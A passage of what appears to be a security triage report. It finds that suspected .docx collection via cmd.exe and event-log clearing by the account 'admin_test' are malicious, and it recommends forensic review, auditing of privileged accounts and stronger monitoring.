   - **Command Line Execution from CMD**: There are commands executed via `cmd.exe` that are related to extracting `.docx` files from the filesystem (`mkdir`, `dir`, `findstr`, and `copy`) and copying them to a temporary directory. This behavior aligns with data exfiltration techniques and is highly suspicious.

3. **Execution of Legitimate Microsoft Processes**:
   - There are multiple entries related to Microsoft Edge Update and other legitimate Windows services and processes (such as `sc.exe`, `taskhostw.exe`, `musnotification.exe`, and others) that appear benign in isolation. However, without context and considering shuffled logs, these should be examined in a broader investigation, especially if there's an overlap in the timeline with the suspicious log-clearing activity.

**Guidance**:
- **Immediate Review**: The actions of user ""admin_test"" need immediate investigation. The log-clearing events, along with the suspicious command execution patterns, suggest this account might be compromised or maliciously used.
- **Audit Privileged Accounts**: Review and audit activities performed by privileged accounts like ""admin_test"" to confirm whether activities align with their standard operational scope.
- **Forensic Analysis**: Conduct a detailed forensic investigation focusing on the timeline around the suspicious events to identify any data exfiltration, unauthorized access, or lateral movement within the network.
- **Strengthen Monitoring**: Implement additional security measures and monitoring to detect and respond to such activities. Ensure that audit logs are securely retained and monitored to identify any future attempts at log tampering.

Based on the analysis above, the resolution for the current events is:
- **MALICIOUS**: The detected activities, particularly the event log clearing and command executions, align with a typical attack sequence attempting to hide traces after potentially malicious activities, such as data exfiltration."
